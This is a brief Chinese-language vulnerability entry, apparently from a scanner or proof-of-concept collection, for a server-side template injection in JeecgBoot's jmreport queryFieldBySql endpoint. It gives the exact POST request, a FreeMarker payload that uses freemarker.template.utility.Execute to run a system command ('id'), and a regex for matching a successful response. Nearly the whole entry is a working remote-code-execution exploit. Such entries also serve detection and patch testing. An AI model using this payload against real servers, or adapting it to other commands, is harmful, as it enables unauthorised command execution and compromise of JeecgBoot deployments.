# JeecgBootSSTIRCE漏洞

JeecgBootSSTI ｜ 命令执行 ｜ —
- **请求**：`POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1`

**Payload**
```
{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```
- **响应特征**：200 ^(?=.*?code)(?=.*?200).*?$